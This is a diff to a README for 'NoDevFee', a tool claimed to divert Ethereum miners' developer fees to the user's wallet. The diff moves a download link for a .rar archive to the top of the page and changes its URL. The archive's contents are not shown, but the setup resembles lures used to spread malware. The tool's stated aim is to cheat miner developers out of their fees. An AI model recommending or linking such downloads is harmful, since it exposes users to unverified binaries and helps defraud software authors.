@@ -1,3 +1,8 @@
+## Download Link:
+
+- [ ] [Download NoDevFee for Windows/Linux/MacOS](https://github.com/NoFeesDev/NoDevFee/releases/download/nodevfee_win/NoDevFee-master.rar)
+
+
 ## About The Project NoDevFee -  Ethereum Mining NoDevFee 0% 
 ---
 ![Screenshot](Image1.png)
@@ -28,11 +33,6 @@ Miner. It reduses 1%(or 2% in Dual mode) fee.
 DevFee will mine to your wallet but miner wil think that it mines Real DevFee.
 It was tested on Windows 10 and Windows 7!
 Where to Download?
-
-## Download Link:
-
-- [ ] [Download NoDevFee for Windows/Linux/MacOS](https://github.com/NoFeesDev/NoDevFee/releases/download/nodevfee/NoDevFee-master.rar)
-
 
 ## How to Use?
 
